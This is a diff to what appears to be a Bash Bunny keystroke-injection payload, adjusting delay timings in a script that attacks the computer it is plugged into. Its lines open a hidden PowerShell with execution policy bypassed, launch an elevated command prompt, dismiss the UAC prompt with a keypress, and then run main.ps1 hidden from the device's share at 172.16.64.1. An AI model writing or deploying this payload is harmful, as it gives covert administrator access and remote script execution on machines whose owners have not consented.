@@ -52,17 +52,17 @@ Q SET_LANGUAGE DE
 
 # Launch powershell as admin and deletes Run history
 Q GUI r
-Q DELAY 750
+Q DELAY 1000
 Q STRING powershell -NoP -NonI -W Hidden -Exec Bypass -c "Start-Process cmd -A '/t:fe /k mode con lines=1 cols=18' -Verb runAs"
 Q ENTER
 
 # Bypass UAC Chenge "ALT j" according to your language i.e. for us it is ALT o
-Q DELAY 750
+Q DELAY 1000
 Q ALT j
 Q DELAY 750
 
 # Wait for Bunny Ethernet and Start main.ps1 Powershell Script
-Q DELAY 1000
+Q DELAY 500
 Q STRING "powershell \"while (1) { If (Test-Connection 172.16.64.1 -count 1 -quiet) { sleep 2; powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File \\\172.16.64.1\e\main.ps1; exit } }\""
 Q ENTER
 Q DELAY 2000 
